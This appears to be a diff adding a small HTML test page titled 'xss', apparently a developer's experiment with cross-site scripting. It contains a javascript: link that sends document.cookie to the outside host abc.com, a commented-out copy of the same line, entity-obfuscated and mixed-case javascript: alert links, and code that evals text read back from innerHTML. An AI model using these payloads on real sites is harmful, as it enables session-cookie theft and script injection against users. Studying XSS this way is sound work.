@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html><head>
+  <title>xss</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<body>
+<div id="box" class="box">
+</div>
+	<h3>首页</h3>
+	<a href="/generator">generator案例</a>
+    <a href="javascript:window.location.href='http://abc.com?s='+document.cookie">link1
+    <script>
+      console.warn('test');
+    </script>
+    </a>
+    <a href="&#106;avaScript:alert(12)">link2</a>
+	  <a href="javaScript:alert(12)">link3</a>
+  <script>
+    var t = '<em>123&lt;script&gt;console.log(123);&lt;script&gt;</em>';
+    box.innerHTML=t;
+    setTimeout(function(){
+        var str = document.querySelector('em').lastChild.innerHTML;
+        console.warn(' str:',str);
+        eval(str);
+        // window.location.href='http://abc.com?s='+document.cookie
+    },1000)
+  </script>
+</body>
+</html>
